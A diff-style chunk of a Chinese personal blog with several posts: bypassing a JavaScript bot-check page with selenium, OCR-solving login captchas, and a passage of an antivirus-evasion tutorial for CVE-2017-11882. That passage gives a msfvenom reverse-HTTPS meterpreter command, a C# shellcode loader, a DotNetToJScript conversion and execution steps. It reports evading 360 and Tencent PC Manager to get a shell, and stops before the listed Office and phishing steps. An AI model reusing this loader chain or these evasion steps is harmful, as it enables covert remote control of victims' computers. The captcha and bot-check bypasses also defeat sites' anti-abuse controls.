;rmFZnZw.zIAsbP+=+((!+[]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]));rmFZnZw.zIAsbP*=+((+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]));rmFZnZw.zIAsbP*=+((+!![]+[])+(+!![]));rmFZnZw.zIAsbP+=+((!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]));rmFZnZw.zIAsbP+=+((!+[]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]));rmFZnZw.zIAsbP-=+((!+[]+!![]+!![]+[])+(+!![]));rmFZnZw.zIAsbP+=+((!+[]+!![]+!![]+[])+(+!![]));rmFZnZw.zIAsbP+=+((!+[]+!![]+[])+(+!![]));rmFZnZw.zIAsbP-=+((!+[]+!![]+!![]+!![]+[])+(+[]));rmFZnZw.zIAsbP*=+((!+[]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]));a.value = <span class="hljs-built_in">parseInt</span>(rmFZnZw.zIAsbP, <span class="hljs-number">10</span>) + t.length; <span class="hljs-string">'; 121'</span></span></span><br><span class="line"><span class="hljs-undefined">        f.submit();</span></span><br><span class="line"><span class="hljs-undefined">      &#125;, 4000);</span></span><br><span class="line"><span class="hljs-javascript">    &#125;, <span class="hljs-literal">false</span>);</span></span><br><span class="line"><span class="hljs-undefined">  &#125;)();</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-comment">//]]&gt;</span></span></span><br><span class="line"><span class="hljs-undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"100%"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"100%"</span> <span class="hljs-attr">cellpadding</span>=<span class="hljs-string">"20"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">"center"</span> <span class="hljs-attr">valign</span>=<span class="hljs-string">"middle"</span>&gt;</span></span><br><span class="line">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"yjs-browser-verification yjs-im-under-attack"</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">noscript</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">data-translate</span>=<span class="hljs-string">"turn_on_js"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"color:#bd2426;"</span>&gt;</span>请打开浏览器的javascript，然后刷新浏览器<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">noscript</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"yjs-content"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubbles"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubbles"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubbles"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>webbaozi.com <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">data-translate</span>=<span class="hljs-string">"checking_browser"</span>&gt;</span>浏览器安全检查中...<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">data-translate</span>=<span class="hljs-string">"process_is_automatic"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">data-translate</span>=<span class="hljs-string">"allow_5_secs"</span>&gt;</span>还剩 5 秒&amp;hellip;<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"challenge-form"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"/cdn-cgi/l/chk_jschl"</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"jschl_vc"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"3e6d314d3209433cc8d475dce0d7f73a"</span>/&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"pass"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"1512703287.646-mblyHaO5bp"</span>/&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"jschl-answer"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"jschl_answer"</span>/&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"attribution"</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://su.baidu.com/"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"font-size: 12px;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line">      <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;其中一个解决办法就是用python将这段JS代码执行后得到<code>jschl-answer</code>的值，然后构造get请求提交，从而获得<code>cookies</code>。但是笔者在用requests处理的时候发现，就算将结果运行出来后，使用<code>requests.get()</code>的时候还是会重定向到检测页面，没有办法验证通过。一个可能的原因是requests并不会记录<code>会话</code>，当你提交结果的时候，检测系统会把你当作第一次访问，而不会认为你已经访问过一次，现在是提交结果。这是<code>requests</code>的工作方式。所以只能另想办法。</p>
+<p>&emsp;&emsp;我们需要能像浏览器一样能自动解析JS代码的爬虫库，而<code>selenium</code>，这个自动化测试工具就能实现这个目标。所以一个有效的解决方案就是使用<code>selenium</code>，接下来就用代码解释：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser = webdriver.PhantomJS()</span><br><span class="line">host = <span class="hljs-string">'http://www.xxxx.com'</span></span><br><span class="line">browser.get(host)</span><br><span class="line">sleep(<span class="hljs-number">7</span>)    <span class="hljs-comment">#这里注意需要睡眠5s以上，因为检测页面需要5s左右的时间通过，通过后才能获得真正的网页。</span></span><br><span class="line">soup = BeautifulSoup(browser.page_source,<span class="hljs-string">'lxml'</span>)</span><br><span class="line"><span class="hljs-comment"># 下面就可以做你需要的工作了</span></span><br></pre></td></tr></table></figure>
+<h3 id="关于python运行JavaScript"><a href="#关于python运行JavaScript" class="headerlink" title="关于python运行JavaScript"></a>关于python运行JavaScript</h3><p>&emsp;&emsp;这里顺带记录如何在python下运行JavaScript。代码：<br><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> execjs</span><br><span class="line">fct = <span class="hljs-string">"""</span></span><br><span class="line"><span class="hljs-string">function test()&#123;</span></span><br><span class="line"><span class="hljs-string">    var a = 10;</span></span><br><span class="line"><span class="hljs-string">    var b = 20;</span></span><br><span class="line"><span class="hljs-string">    return a+b;</span></span><br><span class="line"><span class="hljs-string">&#125;</span></span><br><span class="line"><span class="hljs-string">"""</span></span><br><span class="line">ej = execjs.compile(fct)</span><br><span class="line">value = ej.call(<span class="hljs-string">"test"</span>) <span class="hljs-comment"># 调用JS函数并取得返回值</span></span><br><span class="line">print(value)</span><br></pre></td></tr></table></figure></p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-12-03T14:20:00.000Z">2017-12-03</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    1 分钟 读完 (大约 130 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/12/some-codes/">学习中的一些代码及小tips记录</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;本项目记录各种代码及小tips，项目地址为：<a href="https://github.com/DelCoding/MyCodes，" target="_blank" rel="noopener">https://github.com/DelCoding/MyCodes，</a> 这篇文章将<code>持续更新</code>。</p>
+<h3 id="代码记录"><a href="#代码记录" class="headerlink" title="代码记录"></a>代码记录</h3><ul>
+<li><strong><a href="https://github.com/DelCoding/MyCodes/blob/master/Using%20Stack%20and%20Suffix" target="_blank" rel="noopener">1、将中缀表达式转化成后缀表达式</a></strong></li>
+<li><strong><a href="https://github.com/DelCoding/MyCodes/blob/master/send_ip.py" target="_blank" rel="noopener">2、获取本机IP，并通过邮箱发送</a></strong></li>
+<li><strong>3、Java多线程多人聊天室</strong><ul>
+<li><strong><a href="https://github.com/DelCoding/MyCodes/blob/master/MulitServer.java" target="_blank" rel="noopener">MulitServer.java是服务器版</a></strong></li>
+<li><strong><a href="https://github.com/DelCoding/MyCodes/blob/master/MulitClient.java" target="_blank" rel="noopener">Mulitclient.java是客户端</a></strong></li>
+</ul>
+</li>
+<li><strong><a href="https://github.com/DelCoding/MyCodes/blob/master/idea%E4%B8%8B%E4%BD%BF%E7%94%A8JavaBean.md" target="_blank" rel="noopener">4、idea下使用JavaBean</a></strong></li>
+<li><strong><a href="https://github.com/DelCoding/MyCodes/blob/master/bank.py" target="_blank" rel="noopener">5、银行家算法</a></strong></li>
+<li><strong><a href="https://github.com/DelCoding/MyCodes/blob/master/checksum.py" target="_blank" rel="noopener">6、计算一个文件的16位校验和算法</a></strong></li>
+<li><strong><a href="https://github.com/DelCoding/MyCodes/blob/master/whoosh.py" target="_blank" rel="noopener">7、使用whoosh为mongodb建立索引</a></strong></li>
+</ul>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-11-28T16:00:00.000Z">2017-11-29</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    5 分钟 读完 (大约 709 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/11/selenium-verity-code/">Selenium下自动识别验证码登陆</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;在自动化或者爬虫登陆网站时经常遇到验证码模块，这也算是反爬的一种手段。这篇文章将介绍如何在selenium框架下自动识别验证码登陆。</p>
+<h3 id="一：安装Tesseract-ocr"><a href="#一：安装Tesseract-ocr" class="headerlink" title="一：安装Tesseract-ocr"></a>一：安装Tesseract-ocr</h3><p>&emsp;Tesseract-ocr是文字识别系统，能识别英文、数字，如果需要识别汉字，则需要导入汉字语言包。<br></p>
+<ul>
+<li><strong>在Windows下安装</strong><br><br>&emsp;&emsp;下载地址：<a href="https://digi.bib.uni-mannheim.de/tesseract/" target="_blank" rel="noopener">Tesseract-ocr</a>，这里可以选择版本，本机中选择<a href="https://digi.bib.uni-mannheim.de/tesseract/tesseract-ocr-setup-4.0.0-alpha.20170804.exe" target="_blank" rel="noopener">4.0.0版</a>。下载后默认安装，这里可以选择修改原安装路径，但修改后在后续进行环境变量的配置时记得更改。<br>&emsp;&emsp;安装完毕后，配置系统环境变量。在Path一项中新增Tesseract-ocr的安装路径。<div align="center"><br>  <img src="/images/posts/other/9.png"><br></div>
+
+</li>
+</ul>
+<p>&emsp;&emsp;接着在系统变量中新建如下系统变量，告诉Tesseract-ocr数据集的位置。</p>
+<div align="center"><br>    <img src="/images/posts/other/10.png"><br></div>
+
+<p>&emsp;&emsp;然后验证是否安装成功。</p>
+<div align="center"><br>    <img src="/images/posts/other/11.png"><br></div>
+
+<ul>
+<li><strong>在Linux下安装</strong><br><br>&emsp;&emsp;直接执行：apt install tesseract-ocr。</li>
+</ul>
+<h3 id="二：python脚本"><a href="#二：python脚本" class="headerlink" title="二：python脚本"></a>二：python脚本</h3><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver</span><br><span class="line"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">browser = webdriver.Chrome()</span><br><span class="line"></span><br><span class="line">host = <span class="hljs-string">"https://www.baidu.com"</span></span><br><span class="line">browser.get(host)</span><br><span class="line"><span class="hljs-comment"># 获取整个网页的截图</span></span><br><span class="line">browser.save_screenshot(<span class="hljs-string">"temp.png"</span>)</span><br><span class="line"><span class="hljs-comment"># 获取元素位置</span></span><br><span class="line">element = browser.find_element_by_css_selector(<span class="hljs-string">"img"</span>)</span><br><span class="line">location = element.location</span><br><span class="line">size = element.size</span><br><span class="line"><span class="hljs-comment"># # 计算出元素位置图像坐标</span></span><br><span class="line">img = Image.open(<span class="hljs-string">"temp.png"</span>)</span><br><span class="line">left = location[<span class="hljs-string">'x'</span>] + <span class="hljs-number">145</span></span><br><span class="line">top = location[<span class="hljs-string">'y'</span>] + <span class="hljs-number">90</span></span><br><span class="line">right = location[<span class="hljs-string">'x'</span>] + size[<span class="hljs-string">'width'</span>] + <span class="hljs-number">155</span></span><br><span class="line">bottom = location[<span class="hljs-string">'y'</span>] + size[<span class="hljs-string">'height'</span>] + <span class="hljs-number">100</span></span><br><span class="line">img = img.crop((int(left), int(top), int(right), int(bottom)))</span><br><span class="line">img.save(<span class="hljs-string">'screenshot.png'</span>)  <span class="hljs-comment"># 是否保存图像</span></span><br><span class="line"></span><br><span class="line">log = os.system(<span class="hljs-string">'tesseract screenshot.png png -l eng'</span>)</span><br><span class="line">keyword = open(<span class="hljs-string">'png.txt'</span>, <span class="hljs-string">'r'</span>).readline().rstrip(<span class="hljs-string">'\n'</span>)</span><br><span class="line">rex = re.compile(<span class="hljs-string">r'\D'</span>)</span><br><span class="line"><span class="hljs-keyword">if</span> re.search(rex, keyword) != <span class="hljs-keyword">None</span>:</span><br><span class="line">    print(<span class="hljs-string">'错误的验证码：'</span> + keyword)</span><br><span class="line"><span class="hljs-keyword">else</span>:</span><br><span class="line">    print(<span class="hljs-string">'keyword is '</span> + keyword)</span><br></pre></td></tr></table></figure>
+<p>&emsp;代码说明：selenium自带有截图功能，如果是选择<code>非PhantomJS</code>作为浏览器的话，当使用<code>browser.save_screenshot(&quot;temp.png&quot;)</code>时截的只是当前浏览器窗口显示的图片而<code>不是整个网页</code>，但使用PhantomJS时，截取的<code>是整个网页</code>。<br>&emsp;selenium也可以选择区域或网页元素进行截图，不过需要<code>PIL</code>辅助，先从网页中获取该元素的位置，然后使用PIL Image里的<code>crop</code>截取。这里需要<code>注意</code>，如果使用例如<code>Chrome</code>等浏览器而非<code>PhantomJS</code>的话，会因为浏览器弹出的位置不同，导致无法准确的截到该元素的位置，需要自己反复调节，但使用PhantomJS时不会有这个问题。</p>
+<p>&emsp;可以注意到，我这里是使用系统调用的方法进行识别，但有另一种方法是安装pyocr。直接执行<code>pip install pyocr</code>即可。由于作者不熟悉，加之有急需，故不再演示，只提出方法。</p>
+
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+    <div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2017-11-24T16:20:56.000Z">2017-11-25</time>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    11 分钟 读完 (大约 1644 个字)
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2017/11/office-2017-11882-bypass/">Office CVE-2017-11882实战免杀</a>
+            
+        </h1>
+        <div class="content">
+            <h2 id="放在前面"><a href="#放在前面" class="headerlink" title="放在前面"></a>放在前面</h2><p>&emsp;这里真的要感谢<code>@余弦</code>在<code>懒人在思考</code>的公众号里发过的关于MSF免杀payload的<a href="https://mp.weixin.qq.com/s/OxgJIIPaXMXqrY5lPdukdA" target="_blank" rel="noopener">推文</a>，正是看着这篇文章，再联想到最近火热的<code>office cve-2017-11882</code>，才成功的构造了<code>绕过电脑管家和360</code>的<code>免杀的利用脚本</code>。因为云服务器处于生产环境，并对外提供<code>正经服务</code>，所以只能以局域网环境<code>“实战”</code>。</p>
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;因为关于office 11882的复现及利用都是使用mshta，这个利用方法已经被各杀软重点关注了，所以被拦截的概率会很大，上一篇复现时，连电脑管家都拦截提示了！！所以一个免杀的方法就是使用别的利用工具，而弦哥的这个推文刚好被我从公众号里搜索到，其实很多时候，我们虽然在众里寻他千百度，但很多人却<code>没有</code>“蓦然回首”。关注了这个漏洞的利用脚本的人都知道关键点是可注入的字符越长越好，方便利用，如果要换利用方式的话，替换注入字符就行，而这篇文章也是利用了这一点。</p>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li><a href="#1">一：生成payload</a></li>
+<li><a href="#2">二：创建C#工程文件</a></li>
+<li><a href="#3">三：将生成的exe转换成js</a></li>
+<li><a href="#4">四：结合web server</a></li>
+<li><a href="#5">五：office上场</a></li>
+<li><a href="#6">六：关于钓鱼</a></li>
+</ul>
+<h3 id="一：生成payload"><a href="#一：生成payload" class="headerlink" title="一：生成payload"></a><a name="1"></a>一：生成payload</h3><p>&emsp;使用<code>msfvenom</code>生成C#的payload</p>
+<figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p windows/meterpreter/reverse_https -a x86 -f csharp --platform windows -o https.csharp -b "\x00\xff" LHOST=192.168.1.231 LPORT=443 PrependMigrate=true PrependMigrateProc=svchost.exe</span><br></pre></td></tr></table></figure>
+<p>&emsp;虽然在弦哥的推文中说不用解释选线意义，但出于学习，我还是记录一下：<br>参数说明：-p：选择载荷模块；-a：系统架构（几位）；-f：生成文件的格式；-b：设定规避字符集； PrependMigrate 和 PrependMigrateProc是指明 Payload 执行后要将自己注入到一个新创建的宿主 svchost.exe 进程中去。</p>
+<h3 id="二：创建C-工程文件"><a href="#二：创建C-工程文件" class="headerlink" title="二：创建C#工程文件"></a><a name="2"></a>二：创建C#工程文件</h3><p>&emsp;这里我使用vs2015，我这里.Net Framework本来是没有2.0的，是自己装的，vs2013就有。创建的新项目如下图： </p>
+<div align="center"><br>    <img src="/images/posts/office1/1.png" width="700" height="300"><br></div>
+
+<p>&emsp;将如下代码黏贴覆盖到 Program.cs 中：<br><figure class="highlight c++ hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">using</span> System;</span><br><span class="line"><span class="hljs-keyword">using</span> System.Threading;</span><br><span class="line"><span class="hljs-keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="hljs-keyword">namespace</span> MSFWrapper</span><br><span class="line">&#123;</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span></span></span><br><span class="line"><span class="hljs-class">    &#123;</span></span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Program</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>&#123;</span><br><span class="line">           RunMSF();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">RunMSF</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>&#123;</span><br><span class="line">            byte[] MsfPayload = &#123;</span><br><span class="line">            <span class="hljs-comment">//Paste your Payload here</span></span><br><span class="line">        &#125;;</span><br><span class="line">            IntPtr returnAddr = VirtualAlloc((IntPtr)<span class="hljs-number">0</span>, (uint)Math.Max(MsfPayload.Length, <span class="hljs-number">0x1000</span>), <span class="hljs-number">0x3000</span>, <span class="hljs-number">0x40</span>);</span><br><span class="line">            Marshal.Copy(MsfPayload, <span class="hljs-number">0</span>, returnAddr, MsfPayload.Length);</span><br><span class="line">            CreateThread((IntPtr)<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, returnAddr, (IntPtr)<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (IntPtr)<span class="hljs-number">0</span>);</span><br><span class="line">            Thread.Sleep(<span class="hljs-number">2000</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(<span class="hljs-string">"kernel32.dll"</span>)]</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">VirtualAlloc</span><span class="hljs-params">(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)</span></span>;</span><br><span class="line">        [DllImport(<span class="hljs-string">"kernel32.dll"</span>)]</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">extern</span> IntPtr <span class="hljs-title">CreateThread</span><span class="hljs-params">(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;然后将先前生成的 Payload 的黏贴到代码中注释为<code>“//Paste your Payload here”</code>的地方。这里注意只需要复制那些<code>0x开头</code>的字符，而不需要整个复制下来粘贴。保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”, 然后保存。如下图：</p>
+<div align="center"><br>    <img src="/images/posts/office1/2.png" width="700" height="400"><br></div>
+
+<p>&emsp;在Release 版中添加对X86的支持，然后编译出来，可以得到一个（项目名.exe）</p>
+<div align="center"><br>    <img src="/images/posts/office1/3.png" width="700" height="500"><br></div>
+
+<h3 id="三：将生成的exe转换成js"><a href="#三：将生成的exe转换成js" class="headerlink" title="三：将生成的exe转换成js"></a><a name="3"></a>三：将生成的exe转换成js</h3><p>&emsp;这里我们使用DotNetToJScript ，这是一款可以将 .net 程序转换为 jscript 代码的工具，下载地址：<a href="https://github.com/tyranid/DotNetToJScript/releases" target="_blank" rel="noopener">DotNetToJScript</a>。下载好后进入项目文件夹，运行下面的命令：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">E:\tools\DotNetToJScript&gt;DotNetToJScript.exe -l=JScript -o=MSFWrapper.js -c=MSFWrapper.Program 86.exe</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;这里的86.exe是上面编译生成的文件。运行后可以得到MSFWrapper.js，接下来我们用msf开始监听，这里不细说，直接贴图：</p>
+<div align="center"><br>    <img src="/images/posts/office1/4.png" width="700" height="300"><br></div>
+
+<p>然后我们就可以用下面的命令执行我们的 MSF Payload：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\windows\SysWOW64\cscript.exe MSFWrapper.js</span><br></pre></td></tr></table></figure></p>
+<div align="center"><br>    <img src="/images/posts/office1/5.png" width="700" height="300"><br></div>
+
+<p>运行后，电脑管家跟360跟啥事都没发生过一样。。。。而我们已经Get Shell了</p>
+<div align="center"><br>    <img src="/images/posts/office1/6.png" width="700" height="200"><br></div>
+
+<p>&emsp;到了这里，我们已经可以基本确定弦哥的方法是可行的了。因为要跟office 结合起来，所以我们还需要继续。</p>
